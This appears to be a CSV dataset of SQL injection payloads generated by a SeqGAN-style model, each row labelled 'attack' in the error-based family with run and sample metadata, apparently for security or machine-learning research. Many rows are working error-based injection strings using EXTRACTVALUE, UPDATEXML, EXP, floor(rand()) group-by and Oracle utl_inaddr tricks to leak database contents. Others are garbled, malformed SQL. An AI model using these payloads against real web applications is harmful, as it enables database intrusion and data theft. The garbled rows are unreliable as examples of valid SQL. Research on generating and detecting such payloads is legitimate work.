label,payload,family,payload_type,method,run_id,sample_index
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""voxvs""  =  ""U' where 1618  =  1618 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1082
attack,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1083
attack,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1084
attack,1  )   )     )  #,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1085
attack,"1'   )    a information_schema)   where 4607w  (  count  )  a group when   (  )   SELECT DISTINCT  (  =  a  )   from dual else 0 0 end  )  )   a( mw  =  )   then 1 when   (  select count  )   from 1 gr information_schema.chSYSYS.USSERASthen RDIN'  =  't'  =  'ajju"" like ""re""  =  ""j'  =  'iuuou'  =  'juhuhuuh""  =  ""j",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1086
attack,1'i,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1087
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  """"  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""j'  =  'mjchvu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1088
attack,"1'+  (  select 'ubm'  =  'tu"" like ""n' like 'z",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1089
attack,"-2951 pri0x5crhsp""  =  ""y",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1090
attack,"-7319 or 'i'  =  (  select when   (  select * from   (  =  1297,1   )    jddxxchst  (  )   as else 0 end  )   and 1  )   from 1 information_schema.coaraddr.ts an group by 3051 select 1210  )  )   a s from information_schemas  (  chr  (  e  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1091
attack,"-"" du"" like ""h'  =  'g""  =  ""zl' like 'u'  =  '' like 'ytfw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1092
attack,1'  )   )    having mintysgg elt  (  )   and   (  case when   (  select r  (  select   (  case else 0 end   )      )    )   aro(   g9325  )   --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1093
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1094
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1095
attack,"1'+  (  select 'uzl'+  (  select zpns where 6922  =  6922 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1096
attack,"1%'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  '%'  =  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1097
attack,1' or and from.groupmmitho_sete_rost_mleddr.get_rosts  )   from mow  (  select countchs group by concat  (  select   (  case when   (  chr  (  113  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1098
attack,1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1099
attack,"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%'  =  '' like '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1100
attack,"-7686%""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""'  =  'e""  =  ""jvj'  =  'v'  =  'vul",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1101
attack,"1'+  (  select zpns where 6922  =  6922 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1102
attack," AND 1 5483 and ' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'  )  )  )  )   where  =  )   where  =  (  select 5  (  chr  (  113  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1103
attack,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'e",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1104
attack,"-4822hd"" like ""' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'q9474""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1105
attack,"1""')   where union 6056  =  )   where 0 concat  (  select   (  case when   (  3440  =  )   then 1 group by x  )  a when   (  5840  )   then 1 else 0 end  )   )     )   FROM   (  select mx  )   from   (  =  (  select   (  case when   )    )   )   ,0x717a767a71,T  )   andr  (  case  =  )   as group by from   (  select concat  (  select   (  case when   (  SELECT DIS",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1106
attack,"1%'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1107
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'oww  (  )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1108
attack,"1%'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1109
attack,"14345euy'  =  '' where 1592  =  1592 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1110
attack,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'dss'  =  '  )   or 1 group by concat  (  6825 ,2768 a by b  3440  =  )   or updatexml  (  chrossx.group group by concat  (  4232)   and   (  =  )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1111
attack,"1%'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1112
attack,"1fp"" like "" where uzlt'  =  'izbh",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1113
attack,1'i,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1114
attack,1'  )   a group by concat  (  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1115
attack,"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""u' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1116
attack,1  )   from information_schema.or prostt  (  =  )   --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1117
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdyy"" like ""bn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1118
attack,1' xliibvuj'  =  'z,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1119
attack,"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""akmsxtx.groupolext_tIa5978 FROM Looleu' like 'ul_dlp'  =  ''  =  'ivul_hwp""  =  ""'  =  '""  =  ""iouh'  =  'uhulo",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1120
attack,1'  )   )e   )    ) altefs ex rost_host_setr  (  elt  (  select counas information_schemal  )   as group by x  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1121
attack,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""jjowy'  =  'eu'  =  'u'  =  'joueqh""  =  ""j",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1122
attack,-5032' or proleu_rolw  (  =  ||chr  (  113  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1123
attack,"1""  )   3850 information_schema=  )  )   as group by end  )   from duallz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1124
attack,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""ijoj""  =  ""v'  =  'w'  =  'v'  =  'wvp'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1125
attack,"1%""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1126
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1127
attack,"1"" or group by concat  (  ,concat  (  select   (  case when   (  select 8488 xaleledr.ts s by x  (  =  =  )   FROM   )    )  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1128
attack,1andrhroctsxtxs.p el  (  chr  (  113  )   )   --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1129
